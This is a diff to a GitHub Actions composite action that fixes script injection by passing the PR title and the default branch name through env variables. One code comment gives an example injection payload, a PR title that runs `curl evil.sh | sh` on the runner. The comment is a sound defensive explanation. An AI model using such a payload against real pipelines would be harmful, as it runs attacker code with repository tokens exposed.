@@ -54,6 +54,13 @@ runs:
       id: base
       shell: bash
       working-directory: ${{ inputs.working-directory }}
+      env:
+        # Through `env` for the same reason as PR_TITLE below: templated into the script, a
+        # `${{ github.event.* }}` value is substituted before bash parses it. This one needs
+        # repo-admin access to set rather than merely opening a PR, so the threat model is
+        # much smaller - but git ref names permit `;`, backticks and `$`, so the shape is
+        # identical and the guard that found it has no exemption list on purpose.
+        DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
       run: |
         set -euo pipefail
 
@@ -62,7 +69,7 @@ runs:
           if [ -n "${GITHUB_BASE_REF:-}" ]; then
             BASE="$GITHUB_BASE_REF"                      # pull_request: the target branch
           else
-            BASE="${{ github.event.repository.default_branch }}"
+            BASE="${DEFAULT_BRANCH:-}"
           fi
         fi
 
@@ -101,11 +108,24 @@ runs:
         ALIGN_TENANT_ID: ${{ inputs.tenant-id }}
         ALIGN_GATEWAY_URL: ${{ inputs.gateway-url }}
         ALIGN_ENV: ${{ inputs.env }}
+        # Through `env`, never interpolated into the script below. A PR title is written by
+        # whoever opened the PR, so `${{ github.event.pull_request.title }}` inside a run block
+        # is a script-injection hole: a PR titled `"; curl evil.sh | sh; #` would execute on the
+        # runner with the token in scope. An env value is passed to the shell as data.
+        # Empty on any non-PR trigger (workflow_dispatch, push), which the guard below handles.
+        PR_TITLE: ${{ github.event.pull_request.title }}
       run: |
         set -uo pipefail
 
+        # Positional args rather than an array: `"${ARR[@]}"` on an EMPTY array errors under
+        # `set -u` in bash 3.2, which is what macOS runners ship. `"$@"` is safe when empty.
+        set -- --ci --base "${{ steps.base.outputs.ref }}"
+        if [ -n "${PR_TITLE:-}" ]; then
+          set -- "$@" --title "$PR_TITLE"
+        fi
+
         set +e
-        OUT="$(npx --yes "@aligndottech/cli@${{ inputs.cli-version }}" check --ci --base "${{ steps.base.outputs.ref }}")"
+        OUT="$(npx --yes "@aligndottech/cli@${{ inputs.cli-version }}" check "$@")"
         CODE=$?
         set -e
 
